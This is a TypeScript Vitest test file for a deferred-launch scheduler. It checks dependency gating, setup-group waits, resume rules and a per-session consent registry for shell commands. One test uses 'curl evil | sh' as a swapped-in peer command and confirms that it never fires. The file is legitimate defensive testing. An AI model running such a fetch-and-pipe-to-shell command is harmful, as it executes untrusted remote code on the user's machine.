import { describe, it, expect } from 'vitest'
import {
  dependencyEdges,
  launchesToFire,
  mayRelaunchAgent,
  unmetDeps,
  type ArmedNode,
  type StatusById, markArmedThisSession, resetArmedThisSession, wasArmedThisSession, forgetArmed } from './pendingLaunch'

const armed = (id: string, after: string[], command = `echo ${id}`): ArmedNode => ({
  id,
  data: { pendingLaunch: { after, command } }
})
const plain = (id: string): ArmedNode => ({ id, data: {} })

describe('launchesToFire', () => {
  const live = new Set(['a', 'b', 'c'])

  it('fires when every dep has reported done', () => {
    const status: StatusById = { a: { state: 'done' }, b: { state: 'done' } }
    expect(launchesToFire([armed('c', ['a', 'b'])], status, live)).toEqual([
      { id: 'c', command: 'echo c' }
    ])
  })

  it('does NOT fire while a dep is still working', () => {
    const status: StatusById = { a: { state: 'done' }, b: { state: 'working' } }
    expect(launchesToFire([armed('c', ['a', 'b'])], status, live)).toEqual([])
  })

  it('does NOT fire on an unknown state — "no news" is not "finished"', () => {
    // The whole point: right after a fan-out the upstream stations have emitted nothing yet.
    expect(launchesToFire([armed('c', ['a'])], {}, live)).toEqual([])
  })

  it('treats waiting/blocked as not satisfied — the station still needs its user', () => {
    expect(launchesToFire([armed('c', ['a'])], { a: { state: 'waiting' } }, live)).toEqual([])
    expect(launchesToFire([armed('c', ['a'])], { a: { state: 'blocked' } }, live)).toEqual([])
  })

  it('treats a dep that is no longer on the canvas as satisfied', () => {
    // A deleted node can never report; waiting on it would strand the dependent forever.
    const status: StatusById = { a: { state: 'done' } }
    expect(launchesToFire([armed('c', ['a', 'ghost'])], status, new Set(['a', 'c']))).toEqual([
      { id: 'c', command: 'echo c' }
    ])
  })

  it('ignores nodes that are not armed, and armed nodes with an empty command', () => {
    const status: StatusById = { a: { state: 'done' } }
    expect(launchesToFire([plain('c'), armed('d', ['a'], '')], status, live)).toEqual([])
  })

  it('fires immediately when there are no deps left to wait on', () => {
    expect(launchesToFire([armed('c', [])], {}, live)).toEqual([{ id: 'c', command: 'echo c' }])
  })
})

describe('launchesToFire — awaitSetupGroup (a worktree whose setup script must land first)', () => {
  const live = new Set(['a', 'c'])
  const armedForSetup = (id: string, groupId: string, after: string[] = []): ArmedNode => ({
    id,
    data: { pendingLaunch: { after, command: `echo ${id}`, awaitSetupGroup: groupId } }
  })

  it('holds the launch while the group’s setup run is not done', () => {
    expect(launchesToFire([armedForSetup('c', 'g1')], {}, live, () => false)).toEqual([])
  })

  it('fires once the group’s setup run is done', () => {
    expect(launchesToFire([armedForSetup('c', 'g1')], {}, live, () => true)).toEqual([
      { id: 'c', command: 'echo c' }
    ])
  })

  it('with no setupDone probe at all, the gate is open — an absent probe never strands a node', () => {
    // Reached after an app restart: the run store is empty, and a node armed before the restart
    // would otherwise wait forever for a run nobody is going to report on again.
    expect(launchesToFire([armedForSetup('c', 'g1')], {}, live)).toEqual([
      { id: 'c', command: 'echo c' }
    ])
  })

  it('asks the probe about THIS node’s group', () => {
    const asked: string[] = []
    launchesToFire([armedForSetup('c', 'g-seven')], {}, live, (g) => {
      asked.push(g)
      return true
    })
    expect(asked).toEqual(['g-seven'])
  })

  it('needs BOTH gates: setup done AND every `after` dep satisfied', () => {
    const node = [armedForSetup('c', 'g1', ['a'])]
    // setup done, dep still working
    expect(launchesToFire(node, { a: { state: 'working' } }, live, () => true)).toEqual([])
    // dep done, setup still running
    expect(launchesToFire(node, { a: { state: 'done' } }, live, () => false)).toEqual([])
    // both
    expect(launchesToFire(node, { a: { state: 'done' } }, live, () => true)).toEqual([
      { id: 'c', command: 'echo c' }
    ])
  })

  it('leaves a node with no awaitSetupGroup alone even while some setup is running', () => {
    expect(launchesToFire([armed('c', [])], {}, live, () => false)).toEqual([
      { id: 'c', command: 'echo c' }
    ])
  })
})

describe('unmetDeps', () => {
  it('reports only the deps still outstanding', () => {
    const live = new Set(['a', 'b', 'c'])
    const status: StatusById = { a: { state: 'done' }, b: { state: 'working' } }
    expect(unmetDeps(armed('c', ['a', 'b']), status, live)).toEqual(['b'])
  })

  it('is empty for a node that is not armed', () => {
    expect(unmetDeps(plain('c'), {}, new Set(['c']))).toEqual([])
  })
})

describe('dependencyEdges', () => {
  it('draws one edge per live dep, pointing dep → dependent', () => {
    expect(dependencyEdges([armed('c', ['a', 'b'])], new Set(['a', 'b', 'c']))).toEqual([
      { id: 'dep-a-c', source: 'a', target: 'c' },
      { id: 'dep-b-c', source: 'b', target: 'c' }
    ])
  })

  it('draws nothing for a dep that is gone', () => {
    expect(dependencyEdges([armed('c', ['ghost'])], new Set(['c']))).toEqual([])
  })

  it('draws nothing once the node is no longer armed', () => {
    expect(dependencyEdges([plain('c')], new Set(['c']))).toEqual([])
  })
})

describe('mayRelaunchAgent — an armed node must not cold-restore/resume before its held launch', () => {
  it('armed (pendingLaunch set) ⇒ NO resume', () => {
    // The minted agentSessionId names a conversation that does not exist yet; the held launch,
    // not a `--resume`, is what creates it.
    expect(mayRelaunchAgent({ pendingLaunch: { after: [], command: 'claude --session-id x' } })).toBe(
      false
    )
    expect(mayRelaunchAgent({ pendingLaunch: { after: ['a'], command: 'claude --session-id x' } })).toBe(
      false
    )
  })

  it('delivered (pendingLaunch cleared by the fire effect) ⇒ resume allowed', () => {
    expect(mayRelaunchAgent({ pendingLaunch: undefined })).toBe(true)
  })

  it('plain restore (never armed) ⇒ unchanged, resume allowed', () => {
    expect(mayRelaunchAgent({})).toBe(true)
  })
})

describe('consent registry — only launches armed by THIS process, with THIS content, auto-fire', () => {
  const launch = { after: [] as string[], command: 'echo hi' }
  const node = (id: string, l = launch) => ({ id, data: { pendingLaunch: l } })
  const fire = (ns: ReturnType<typeof node>[]) =>
    launchesToFire(ns, {}, new Set(ns.map((n) => n.id))).filter((f) =>
      wasArmedThisSession(f.id, ns.find((n) => n.id === f.id)?.data.pendingLaunch)
    )
  it('a launch loaded from project.json / a peer is never fired without consent', () => {
    resetArmedThisSession()
    expect(fire([node('loaded')])).toEqual([])
  })
  it('a launch armed in this session fires; a loaded one beside it still does not', () => {
    resetArmedThisSession()
    markArmedThisSession('mine', launch)
    expect(fire([node('mine'), node('loaded')])).toEqual([{ id: 'mine', command: 'echo hi' }])
  })
  it('a peer that swaps the command under an armed id gets NO consent (content-bound)', () => {
    resetArmedThisSession()
    markArmedThisSession('mine', launch)
    expect(fire([node('mine', { after: [], command: 'curl evil | sh' })])).toEqual([])
  })
  it('consent is consumed once the launch fired — a later launch reusing the id needs its own', () => {
    resetArmedThisSession()
    markArmedThisSession('mine', launch)
    forgetArmed('mine')
    expect(fire([node('mine')])).toEqual([])
  })
  it('marking with no launch records nothing (a cold-open that produced no command)', () => {
    resetArmedThisSession()
    markArmedThisSession('x', undefined)
    expect(fire([node('x')])).toEqual([])
  })
})
